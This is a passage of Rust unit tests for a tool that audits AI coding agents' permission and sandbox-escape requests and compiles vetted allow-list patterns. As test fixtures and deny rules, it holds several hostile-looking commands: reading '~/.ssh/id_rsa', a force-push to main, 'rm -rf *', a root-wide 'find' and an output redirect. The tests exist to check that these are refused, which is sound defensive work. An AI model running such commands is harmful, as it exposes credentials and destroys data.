        assert!(text.contains("added:"), "got {text}");
        assert!(text.contains("gh issue *"), "got {text}");
        assert!(text.contains("ctx.toml.bak"), "got {text}");

        let allow = crate::commands::setup::read_home_safety_allow(home.path()).expect("read");
        assert_eq!(
            allow,
            vec!["cargo nextest *".to_string(), "gh issue *".to_string()],
            "the pre-existing entry survives; the new one is appended"
        );
        assert!(
            home.path().join(".zirv/ctx.toml.bak").is_file(),
            "the pre-write file must be backed up"
        );
    }

    #[test]
    fn run_compile_writes_eligible_families_and_reports_protected_and_duplicate_skips() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[safety]\nallow = [\"gh issue *\"]\n",
        )
        .expect("seed existing allow");

        let dir = tempfile::tempdir().expect("transcripts");
        let lines = [
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "sandbox_permissions": "require_escalated",
                    // Already covered by the seeded allow entry -- must be
                    // reported as a duplicate, not written again.
                    "command": "gh issue create --title x --body-file /tmp/body.md"
                }
            })
            .to_string(),
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "sandbox_permissions": "require_escalated",
                    "command": "cargo nextest run --no-fail-fast"
                }
            })
            .to_string(),
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "sandbox_permissions": "require_escalated",
                    "command": "git push --force origin main"
                }
            })
            .to_string(),
        ];
        std::fs::write(dir.path().join("s1.jsonl"), lines.join("\n")).expect("write fixture");

        let requests: Vec<PermissionRequest> = lines
            .iter()
            .flat_map(|line| extract_codex_requests(line, "s1"))
            .collect();
        let report = AuditReport {
            agent: "codex",
            sessions_scanned: 1,
            total_requests: requests.len(),
            groups: group_requests(&requests),
            requests: requests.clone(),
        };
        let (eligible, skipped_protected, _) = compile_eligibility(&report.groups);
        let existing = crate::commands::setup::read_home_safety_allow(home.path()).expect("read");
        let (added, duplicates) =
            crate::commands::setup::union_allow_patterns(&existing, &eligible);
        crate::commands::setup::union_home_safety_allow(home.path(), &eligible).expect("write");

        assert_eq!(added, vec!["cargo nextest *".to_string()]);
        assert_eq!(duplicates, vec!["gh issue *".to_string()]);
        assert_eq!(skipped_protected, vec!["git push".to_string()]);

        let allow = crate::commands::setup::read_home_safety_allow(home.path()).expect("read");
        assert_eq!(
            allow,
            vec!["gh issue *".to_string(), "cargo nextest *".to_string()],
            "the seeded entry survives; the new one is appended; git push is never written"
        );
    }

    // -------------------------------------------------------------
    // Issue #147, design decision 6: `--escape` compile
    // -------------------------------------------------------------

    /// Writes a claude transcript recording an accepted sandbox-escape ask
    /// for `command`/`session`, and the correlating safety-decision log
    /// entry, under `home` -- the fixture shape
    /// `run_compile --agent claude --escape` audits end to end.
    fn write_claude_escape_ask_fixture(session: &str, command: &str, ts: u64) {
        // Reads whatever `ZIRV_CTX_STATE_DIR` the caller has already set via
        // `VarGuard` -- must be called after that guard is in scope, so the
        // log lands exactly where `audit_report`'s own real-env read will
        // look for it.
        let state_dir =
            super::super::state::StateDir::resolve(&super::super::config::env_from_process())
                .expect("resolve test state dir");
        log::append_safety(
            &state_dir,
            &log::SafetyDecision {
                ts,
                session,
                mode: "interactive",
                verdict: "ask",
                command_sha256: &sha256_hex(command.trim().as_bytes()),
                policy_sha256: "p",
                launch_policy_sha256: None,
                attestation: "not-present",
                matched_pattern: Some("<sandbox: unsandboxed retry>"),
                origin: Some("built-in"),
                platform: "linux",
            },
        )
        .expect("append safety decision");

        let home = crate::utils::home_dir().expect("home dir");
        let projects_dir = home.join(".claude").join("projects").join("repo");
        std::fs::create_dir_all(&projects_dir).expect("mkdir");
        let use_line = sandbox_escape_tool_use(
            "t1",
            command,
            "2026-08-26T10:00:00.000Z",
            Some("default"),
            false,
        );
        let ok_result = tool_result_line("t1", false, "ok");
        std::fs::write(
            projects_dir.join(format!("{session}.jsonl")),
            format!("{use_line}\n{ok_result}\n"),
        )
        .expect("write transcript");
    }

    /// End to end: an accepted, recurring sandbox-escape ask for a
    /// non-generic, non-protected, screen-clean family is printed as a
    /// recommendation WITHOUT `--escape`, and actually written to `[safety]
    /// escape_allow` WITH it.
    #[test]
    fn run_compile_escape_previews_without_the_flag_and_writes_with_it() {
        let command = "zirv ctx status";
        let session = "escape-session";

        // Preview (--dry-run, no --escape): recommendation printed under
        // `would_add`, nothing written at all -- isolates the `--escape`
        // wording/gating from the ordinary `[safety] allow` compile, which
        // writes independently of `--escape` and would otherwise also pick
        // up this same reusable, unprotected family.
        {
            let home = tempfile::tempdir().expect("home");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let _state_env = crate::commands::ctx::testenv::VarGuard::set(&[(
                super::super::state::STATE_ENV,
                Some(home.path().join("state").to_str().expect("utf8 state")),
            )]);
            write_claude_escape_ask_fixture(session, command, 1_787_738_400);

            let args = CompileArgs {
                agent: AuditAgent::Claude,
                sessions: 5,
                dry_run: true,
                escape: false,
            };
            let mut out = Vec::new();
            let code = run_compile(&args, &mut out).expect("run_compile");
            assert_eq!(code, 0);
            let text = String::from_utf8(out).expect("utf8");
            assert!(text.contains("Sandbox-escape compile"), "got {text}");
            assert!(text.contains("preview only"), "got {text}");
            assert!(text.contains("would_add"), "got {text}");
            assert!(text.contains("zirv ctx status *"), "got {text}");
            assert!(
                !home.path().join(".zirv/ctx.toml").exists(),
                "a dry run must not write anything: {text}"
            );
        }

        // Real write (--escape): the pattern lands in [safety] escape_allow.
        {
            let home = tempfile::tempdir().expect("home");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let _state_env = crate::commands::ctx::testenv::VarGuard::set(&[(
                super::super::state::STATE_ENV,
                Some(home.path().join("state").to_str().expect("utf8 state")),
            )]);
            write_claude_escape_ask_fixture(session, command, 1_787_738_400);

            let args = CompileArgs {
                agent: AuditAgent::Claude,
                sessions: 5,
                dry_run: false,
                escape: true,
            };
            let mut out = Vec::new();
            let code = run_compile(&args, &mut out).expect("run_compile");
            assert_eq!(code, 0);
            let text = String::from_utf8(out).expect("utf8");
            assert!(text.contains("added:"), "got {text}");
            assert!(text.contains("zirv ctx status *"), "got {text}");

            let escape_allow =
                crate::commands::setup::read_home_safety_escape_allow(home.path()).expect("read");
            assert_eq!(escape_allow, vec!["zirv ctx status *".to_string()]);
            // The ordinary `[safety] allow` compile runs independently of
            // `--escape` (unaffected by it either way) and picks up this
            // same reusable, unprotected family on its own -- both keys end
            // up populated, from two separate write paths.
            let allow = crate::commands::setup::read_home_safety_allow(home.path()).expect("read");
            assert_eq!(allow, vec!["zirv ctx status *".to_string()]);
        }
    }

    /// Design decision 6's eligibility gate: a single-token family (no
    /// subcommand) is refused as too generic, even for an otherwise
    /// screen-clean, accepted sandbox-escape ask.
    #[test]
    fn escape_eligibility_refuses_a_too_generic_family() {
        let requests = vec![PermissionRequest {
            session: "s".into(),
            raw: "echo hi".into(),
            family: "echo".into(),
            cause: "interactive sandbox-escape ask".into(),
            result: "escalated-accepted".into(),
            reusable: true,
            permission_mode: "default".into(),
            is_sidechain: false,
        }];
        let (eligible, _protected, too_generic) = escape_eligibility(&requests);
        assert!(eligible.is_empty(), "{eligible:?}");
        assert_eq!(too_generic, vec!["echo".to_string()]);
    }

    /// A protected family (e.g. a destructive/global-write shape) must
    /// never be compiled into `escape_allow`, matching the ordinary
    /// `compile_eligibility`'s own guarantee.
    #[test]
    fn escape_eligibility_refuses_a_protected_family() {
        let requests = vec![PermissionRequest {
            session: "s".into(),
            raw: "git push --force origin main".into(),
            family: "git push".into(),
            cause: "interactive sandbox-escape ask".into(),
            result: "escalated-accepted".into(),
            reusable: true,
            permission_mode: "default".into(),
            is_sidechain: false,
        }];
        let (eligible, protected, _too_generic) = escape_eligibility(&requests);
        assert!(eligible.is_empty(), "{eligible:?}");
        assert_eq!(protected, vec!["git push".to_string()]);
    }

    /// Design decision 6's own security requirement: a family with ANY
    /// observed invocation touching a credential path, `.env`, or a
    /// root-wide `find` must never be compiled, even though the family
    /// itself (`cat`/`find`) is otherwise an ordinary read-only utility.
    #[test]
    fn escape_eligibility_refuses_a_family_with_a_credential_touching_member() {
        let requests = vec![
            PermissionRequest {
                session: "s".into(),
                raw: "cat /var/log/app.log".into(),
                family: "cat".into(),
                cause: "interactive sandbox-escape ask".into(),
                result: "escalated-accepted".into(),
                reusable: true,
                permission_mode: "default".into(),
                is_sidechain: false,
            },
            PermissionRequest {
                session: "s".into(),
                raw: "cat ~/.ssh/id_rsa".into(),
                family: "cat".into(),
                cause: "interactive sandbox-escape ask".into(),
                result: "escalated-accepted".into(),
                reusable: true,
                permission_mode: "default".into(),
                is_sidechain: false,
            },
        ];
        // `cat` alone is too generic (single token) regardless, so use a
        // synthetic two-token family to isolate the screen check.
        let requests: Vec<PermissionRequest> = requests
            .into_iter()
            .map(|mut r| {
                r.family = "cat log".to_string();
                r
            })
            .collect();
        let (eligible, skipped, _too_generic) = escape_eligibility(&requests);
        assert!(eligible.is_empty(), "{eligible:?}");
        assert!(
            skipped
                .iter()
                .any(|s| s.starts_with("cat log") && s.contains("screen")),
            "{skipped:?}"
        );
    }

    /// SECURITY (review round 1, 2026-08-27, Critical amendment): the same
    /// screen must refuse a family with any observed member that redirects
    /// output/input via an unquoted `>`/`>>`/`<` -- `command_fails_escape_
    /// screen` delegates straight to `safety::escape_denied_by_screen`, so
    /// this is a regression test for that shared function, exercised
    /// through the compile-eligibility seam rather than a duplicate of the
    /// hook-level test in `safety.rs`.
    #[test]
    fn escape_eligibility_refuses_a_family_with_a_redirecting_member() {
        let requests = vec![PermissionRequest {
            session: "s".into(),
            raw: "echo pwned > log/out.txt".into(),
            family: "echo log".into(),
            cause: "interactive sandbox-escape ask".into(),
            result: "escalated-accepted".into(),
            reusable: true,
            permission_mode: "default".into(),
            is_sidechain: false,
        }];
        let (eligible, skipped, _too_generic) = escape_eligibility(&requests);
        assert!(eligible.is_empty(), "{eligible:?}");
        assert!(
            skipped
                .iter()
                .any(|s| s.starts_with("echo log") && s.contains("screen")),
            "{skipped:?}"
        );
    }

    /// The clean, eligible case: a two-token, unprotected, screen-clean
    /// family compiles to the expected `"<family> *"` pattern.
    #[test]
    fn escape_eligibility_accepts_a_clean_family() {
        let requests = vec![PermissionRequest {
            session: "s".into(),
            raw: "zirv ctx status".into(),
            family: "zirv ctx status".into(),
            cause: "interactive sandbox-escape ask".into(),
            result: "escalated-accepted".into(),
            reusable: true,
            permission_mode: "default".into(),
            is_sidechain: false,
        }];
        let (eligible, protected, too_generic) = escape_eligibility(&requests);
        assert_eq!(eligible, vec!["zirv ctx status *".to_string()]);
        assert!(protected.is_empty(), "{protected:?}");
        assert!(too_generic.is_empty(), "{too_generic:?}");
    }

    // -------------------------------------------------------------
    // Issue #147, design decision 7: native claude permission conflicts
    // -------------------------------------------------------------

    #[test]
    fn read_native_claude_rules_extracts_bash_deny_and_ask_patterns_and_skips_non_bash() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".claude")).expect("mkdir");
        std::fs::write(
            home.path().join(".claude/settings.json"),
            serde_json::json!({
                "permissions": {
                    "deny": ["Bash(rm -rf *)", "Read(~/.ssh/**)"],
                    "ask": ["Bash(*find /*)"]
                }
            })
            .to_string(),
        )
        .expect("write settings");

        let rules = read_native_claude_rules(home.path(), None);
        assert!(
            rules.contains(&("rm -rf *".to_string(), "deny")),
            "{rules:?}"
        );
        assert!(
            rules.contains(&("*find /*".to_string(), "ask")),
            "{rules:?}"
        );
        assert_eq!(
            rules.len(),
            2,
            "the non-Bash Read() rule must be skipped: {rules:?}"
        );
    }

    #[test]
    fn read_native_claude_rules_is_empty_when_the_file_is_absent_or_unparseable() {
        let home = tempfile::tempdir().expect("home");
        assert!(read_native_claude_rules(home.path(), None).is_empty());

        std::fs::create_dir_all(home.path().join(".claude")).expect("mkdir");
        std::fs::write(home.path().join(".claude/settings.json"), "not json").expect("write");
        assert!(read_native_claude_rules(home.path(), None).is_empty());
    }

    #[test]
    fn native_conflict_finds_the_first_matching_rule_and_names_it() {
        let rules = vec![("*find /*".to_string(), "ask")];
        assert_eq!(
            native_conflict(&rules, "find / -name x"),
            Some("Bash(*find /*) [ask]".to_string())
        );
        assert_eq!(native_conflict(&rules, "grep -r TODO ."), None);
    }

    /// A family a recommendation would otherwise present as fixable is
    /// instead annotated with a warning naming the specific native rule
    /// that still blocks/prompts it -- `read_native_claude_rules` never
    /// writes to `~/.claude/settings.json`, only reads it.
    #[test]
    fn render_report_warns_when_a_native_claude_rule_still_conflicts() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".claude")).expect("mkdir");
        std::fs::write(
            home.path().join(".claude/settings.json"),
            serde_json::json!({"permissions": {"ask": ["Bash(cargo nextest *)"]}}).to_string(),
        )
        .expect("write settings");

        let report = AuditReport {
            agent: "claude",
            sessions_scanned: 1,
            total_requests: 1,
            groups: vec![FamilyGroup {
                family: "cargo nextest".into(),
                count: 1,
                reusable: true,
                sample: "cargo nextest run --no-fail-fast".into(),
                cause: "permission-mode dontAsk denial".into(),
                recommendation: "Grant 'cargo nextest' a standing allow".into(),
                protected: false,
            }],
            requests: Vec::new(),
        };
        let native_rules = read_native_claude_rules(home.path(), None);
        let text = render_report(&report, &native_rules);
        assert!(
            text.contains("WARNING") && text.contains("Bash(cargo nextest *) [ask]"),
            "got {text}"
        );

        // A family the native rules say nothing about gets no warning.
        let clean = AuditReport {
            groups: vec![FamilyGroup {
                family: "grep".into(),
                sample: "grep -r TODO .".into(),
                ..report.groups[0].clone()
            }],
            ..report
        };
        assert!(!render_report(&clean, &native_rules).contains("WARNING"));
    }
}
